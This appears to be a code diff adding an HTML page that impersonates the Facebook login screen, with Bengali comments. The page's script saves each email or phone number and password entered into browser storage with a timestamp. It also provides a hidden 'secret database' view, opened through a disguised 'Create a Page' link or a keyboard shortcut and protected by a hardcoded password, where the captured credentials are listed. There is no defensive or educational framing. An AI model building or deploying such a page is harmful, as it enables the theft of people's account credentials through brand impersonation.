@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 980px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 40px;
+            min-height: 90vh;
+        }
+
+        /* Left section */
+        .left-section {
+            flex: 1;
+            min-width: 300px;
+            padding-right: 20px;
+        }
+
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .left-section p {
+            font-size: 1.75rem;
+            color: #1c1e21;
+            line-height: 1.2;
+        }
+
+        /* Right section - Login form */
+        .right-section {
+            flex: 1;
+            min-width: 300px;
+            max-width: 400px;
+        }
+
+        .login-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 20px 28px;
+            width: 100%;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .login-form input {
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .login-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-form button[type="submit"] {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-form button[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-account button {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            border: none;
+        }
+
+        .create-account button:hover {
+            background-color: #36a420;
+        }
+
+        /* Create Page Link - এখন এটি সিক্রেট ডাটাবেস ট্রিগার করবে */
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+        }
+
+        /* Password Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            overflow: auto;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            right: 20px;
+            top: 10px;
+        }
+
+        .close:hover {
+            color: black;
+        }
+
+        .modal h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-size: 24px;
+            border-bottom: 2px solid #f0f2f5;
+            padding-bottom: 10px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .password-input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        .modal-submit {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            font-weight: bold;
+        }
+
+        .modal-submit:hover {
+            background-color: #166fe5;
+        }
+
+        .error-message {
+            color: #f02849;
+            margin: 10px 0;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Database View */
+        .database-view {
+            display: none;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .database-view table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .database-view th {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            text-align: left;
+            position: sticky;
+            top: 0;
+        }
+
+        .database-view td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .database-view tr:hover {
+            background-color: #f5f5f5;
+        }
+
+        .no-data {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+            font-style: italic;
+        }
+
+        /* Clear data button (hidden) */
+        .clear-data {
+            text-align: right;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .clear-data button {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 11px;
+            padding: 5px;
+        }
+
+        .clear-data button:hover {
+            color: #f02849;
+            text-decoration: underline;
+        }
+
+        /* Responsive design */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .left-section {
+                padding-right: 0;
+            }
+
+            .left-section p {
+                font-size: 1.5rem;
+            }
+
+            .right-section {
+                max-width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .left-section h1 {
+                font-size: 3rem;
+            }
+
+            .left-section p {
+                font-size: 1.25rem;
+            }
+            
+            .modal-content {
+                width: 95%;
+                margin: 20% auto;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Left section with Facebook branding -->
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+
+        <!-- Right section with login form -->
+        <div class="right-section">
+            <div class="login-card">
+                <form class="login-form" id="loginForm">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <button type="submit">Log In</button>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgotten password?</a>
+                    </div>
+                    
+                    <div class="divider"></div>
+                    
+                    <div class="create-account">
+                        <button type="button" id="createAccountBtn">Create new account</button>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Create Page Link - এখন এটি সিক্রেট ডাটাবেস ওপেন করবে -->
+            <div class="create-page">
+                <a href="#" id="secretDatabaseTrigger">Create a Page</a> for a celebrity, brand or business.
+            </div>
+            
+            <div class="footer">
+                English (UK) · বাংলা · हिन्दी · ગુજરાતી · ಕನ್ನಡ · മലയാളം · मराठी · தமிழ் · తెలుగు · اردو · ଓଡ଼ିଆ
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Modal -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>🔐 গোপন ডাটাবেস</h2>
+            <p style="margin-bottom: 15px; color: #666;">পাসওয়ার্ড দিন তথ্য দেখার জন্য</p>
+            <input type="password" id="modalPassword" class="password-input" placeholder="পাসওয়ার্ড লিখুন">
+            <div id="passwordError" class="error-message">ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।</div>
+            <button id="submitPassword" class="modal-submit">প্রবেশ করুন</button>
+            
+            <!-- Database View -->
+            <div id="databaseView" class="database-view">
+                <table id="dataTable">
+                    <thead>
+                        <tr>
+                            <th>ইমেইল/ফোন</th>
+                            <th>পাসওয়ার্ড</th>
+                            <th>সময়</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                        <!-- Data will be inserted here -->
+                    </tbody>
+                </table>
+                
+                <!-- Clear data option (hidden but there) -->
+                <div class="clear-data">
+                    <button id="clearDataBtn" onclick="clearAllData()">🗑️ সব ডাটা মুছে ফেলুন</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Database (localStorage এ সংরক্ষণ করা হবে)
+        let userDatabase = JSON.parse(localStorage.getItem('facebookUserData')) || [];
+
+        // সিক্রেট পাসওয়ার্ড (আপনার দেওয়া পাসওয়ার্ড)
+        const SECRET_PASSWORD = '01737029524';
+
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Check if fields are empty
+            if (!email || !password) {
+                alert('দয়া করে ইমেইল এবং পাসওয়ার্ড দিন!');
+                return;
+            }
+            
+            const timestamp = new Date().toLocaleString('bn-BD', {
+                hour12: true,
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+            
+            // Save to database
+            userDatabase.push({
+                email: email,
+                password: password,
+                time: timestamp
+            });
+            
+            // Save to localStorage
+            localStorage.setItem('facebookUserData', JSON.stringify(userDatabase));
+            
+            // Clear form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Optional: Show success message
+            console.log('Data saved:', { email, password, timestamp });
+            
+            // For demo purposes, show an alert
+            alert('তথ্য সংরক্ষণ করা হয়েছে!');
+        });
+
+        // Secret Database Trigger - Create a Page লিঙ্কে ক্লিক করলে
+        document.getElementById('secretDatabaseTrigger').addEventListener('click', function(e) {
+            e.preventDefault(); // Prevent page reload
+            openSecretDatabase();
+        });
+
+        // Open secret database function
+        function openSecretDatabase() {
+            document.getElementById('passwordModal').style.display = 'block';
+            document.getElementById('modalPassword').value = '';
+            document.getElementById('passwordError').style.display = 'none';
+            document.getElementById('databaseView').style.display = 'none';
+            
+            // ফোকাস পাসওয়ার্ড ফিল্ডে
+            setTimeout(() => {
+                document.getElementById('modalPassword').focus();
+            }, 100);
+        }
+
+        // Close modal
+        document.querySelector('.close').addEventListener('click', function() {
+            document.getElementById('passwordModal').style.display = 'none';
+        });
+
+        // Click outside to close
+        window.addEventListener('click', function(event) {
+            const modal = document.getElementById('passwordModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        });
+
+        // Submit password
+        document.getElementById('submitPassword').addEventListener('click', function() {
+            const enteredPassword = document.getElementById('modalPassword').value;
+            
+            if (enteredPassword === SECRET_PASSWORD) {
+                // Correct password - show database
+                document.getElementById('passwordError').style.display = 'none';
+                document.getElementById('databaseView').style.display = 'block';
+                displayUserData();
+            } else {
+                // Wrong password
+                document.getElementById('passwordError').style.display = 'block';
+                document.getElementById('databaseView').style.display = 'none';
+            }
+        });
+
+        // Enter key in password field
+        document.getElementById('modalPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('submitPassword').click();
+            }
+        });
+
+        // Display user data in table
+        function displayUserData() {
+            const tbody = document.getElementById('tableBody');
+            const database = JSON.parse(localStorage.getItem('facebookUserData')) || [];
+            
+            if (database.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="no-data">কোনো তথ্য পাওয়া যায়নি</td></tr>';
+                return;
+            }
+            
+            let html = '';
+            // Show latest data first
+            database.reverse().forEach(item => {
+                // Truncate long data for display
+                const displayEmail = item.email.length > 25 ? item.email.substring(0, 22) + '...' : item.email;
+                const displayPassword = item.password.length > 15 ? item.password.substring(0, 12) + '...' : item.password;
+                
+                html += `
+                    <tr>
+                        <td title="${item.email}">${displayEmail}</td>
+                        <td title="${item.password}">${displayPassword}</td>
+                        <td>${item.time}</td>
+                    </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+
+        // Clear all data function
+        window.clearAllData = function() {
+            if (confirm('আপনি কি সব ডাটা মুছে ফেলতে চান? এই কাজ অপরিবর্তনীয়।')) {
+                localStorage.removeItem('facebookUserData');
+                userDatabase = [];
+                displayUserData();
+                
+                // Show empty message
+                const tbody = document.getElementById('tableBody');
+                tbody.innerHTML = '<tr><td colspan="3" class="no-data">কোনো তথ্য পাওয়া যায়নি</td></tr>';
+                
+                alert('সব ডাটা মুছে ফেলা হয়েছে!');
+            }
+        };
+
+        // Create account button
+        document.getElementById('createAccountBtn').addEventListener('click', function() {
+            alert('Create account functionality would be implemented here!');
+        });
+
+        // Keyboard shortcut: Ctrl+Shift+S দিয়েও খোলা যায় (সিক্রেট অপশন)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+                e.preventDefault();
+                openSecretDatabase();
+            }
+        });
+
+        // Check if there's any data on load
+        window.onload = function() {
+            const data = JSON.parse(localStorage.getItem('facebookUserData')) || [];
+            if (data.length > 0) {
+                console.log(`${data.length} টি তথ্য সংরক্ষিত আছে`);
+            }
+        };
+    </script>
+</body>
+</html>
